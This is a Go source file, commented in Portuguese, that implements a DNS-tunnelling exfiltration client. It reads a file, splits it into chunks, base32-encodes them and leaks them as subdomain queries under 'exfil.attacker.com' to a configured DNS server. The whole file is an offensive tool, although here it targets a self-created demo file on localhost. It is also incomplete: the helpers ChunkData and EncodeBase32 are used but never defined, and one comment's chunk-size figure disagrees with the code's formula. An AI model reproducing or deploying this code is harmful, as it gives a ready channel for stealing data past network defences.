package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	DNSServer = "127.0.0.1:5353" // Endereço do servidor DNS de exfiltração
	BaseDomain  = "exfil.attacker.com" // Domínio base para exfiltração
	MaxDNSSubdomainLength = 63 // Limite de 63 caracteres para subdomínios DNS
)

// generateSessionID gera um ID de sessão aleatório
func generateSessionID() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// sendDNSQuery envia uma requisição DNS de tipo A
func sendDNSQuery(subdomain string) error {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(subdomain), dns.TypeA)
	m.RecursionDesired = true

	c := new(dns.Client)
	r, _, err := c.Exchange(m, DNSServer)
	if err != nil {
		return fmt.Errorf("erro ao enviar requisição DNS: %v", err)
	}
	if r.Rcode != dns.RcodeSuccess {
		return fmt.Errorf("resposta DNS não bem-sucedida: %s", dns.RcodeToString[r.Rcode])
	}
	return nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	filePath := "./data.txt" // Arquivo a ser exfiltrado

	// Criar um arquivo de exemplo para o cliente ler
	exampleData := "Hello World! This is a test message for DNS exfiltration. This message is longer to test chunking."
	err := ioutil.WriteFile(filePath, []byte(exampleData), 0644)
	if err != nil {
		log.Fatalf("Erro ao criar arquivo de exemplo: %v", err)
	}
	fmt.Printf("[*] Arquivo de exemplo %s criado para teste.\n", filePath)

	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		log.Fatalf("Erro ao ler o arquivo %s: %v", filePath, err)
	}

	sessionID := generateSessionID()
	fmt.Printf("[*] Iniciando exfiltração com Session ID: %s\n", sessionID)

	// Calcular o tamanho máximo do chunk de dados brutos que pode ser codificado em base32
	// e ainda caber no limite de 63 caracteres do subdomínio.
	// Cada 5 bytes de dados brutos viram 8 caracteres em base32.
	// Então, para 60 caracteres de base32, precisamos de (60 * 5) / 8 = 37.5, então 37 bytes brutos.
	// Vamos usar um valor seguro, por exemplo, 30 bytes brutos para garantir que caiba.
	dataChunkSize := (MaxDNSSubdomainLength * 5) / 8 - 5 // Ajuste para garantir que o ID da sessão e a ordem caibam

	chunks := ChunkData(fileContent, dataChunkSize)

	for i, chunk := range chunks {
		encodedChunk := EncodeBase32(chunk)
		// Formato: <chunk_codificado>.<sessid>.<ordem>.<dominio_base>
		subdomain := fmt.Sprintf("%s.%s.%d.%s", encodedChunk, sessionID, i, BaseDomain)

		if len(subdomain) > 255 { // Limite total de 255 caracteres para o nome de domínio
			log.Printf("Nome de domínio muito longo (%d caracteres): %s\n", len(subdomain), subdomain)
			continue
		}

		fmt.Printf("[*] Enviando chunk %d (tamanho %d): %s\n", i, len(encodedChunk), subdomain)
		err := sendDNSQuery(subdomain)
		if err != nil {
			log.Printf("Erro ao enviar chunk %d: %v\n", i, err)
		}
		time.Sleep(50 * time.Millisecond) // Pequeno delay para evitar sobrecarga
	}

	// Enviar um chunk finalizador para indicar o fim da sessão
	finalChunk := EncodeBase32([]byte("END_OF_SESSION"))
	finalSubdomain := fmt.Sprintf("%s.%s.%d.%s", finalChunk, sessionID, len(chunks), BaseDomain)
	fmt.Printf("[*] Enviando chunk finalizador: %s\n", finalSubdomain)
	err = sendDNSQuery(finalSubdomain)
	if err != nil {
		log.Printf("Erro ao enviar chunk finalizador: %v\n", err)
	}

	fmt.Println("[*] Exfiltração concluída.")
}


